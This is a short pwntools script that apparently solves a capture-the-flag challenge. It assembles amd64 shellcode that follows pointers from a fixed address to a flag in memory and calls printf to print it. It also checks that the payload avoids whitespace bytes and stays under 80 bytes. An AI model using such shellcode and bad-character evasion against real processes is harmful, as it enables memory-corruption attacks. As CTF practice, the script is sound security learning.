from pwn import *
import string

context.arch = 'amd64'

start = 0x404008
# target = *(*start-0x80)+0x2a0
printf = 0x4010a0

shellcode_insns = [
    f'mov edi, {start}',
    'mov rdi, qword [rdi]',
    'sub rdi, 0x80',
    'mov rdi, qword [rdi]',
    'add rdi, 0x2a0',
    # rdi now contains a pointer to the flag
    f'push 0x13371337',
    f'push {printf}',
    'ret',
]

shellcode = b''.join(asm(ins) for ins in shellcode_insns)

assert all(x.encode() not in shellcode for x in string.whitespace)
assert len(shellcode) < 80

print(disasm(shellcode))
print()
print(shellcode.hex())
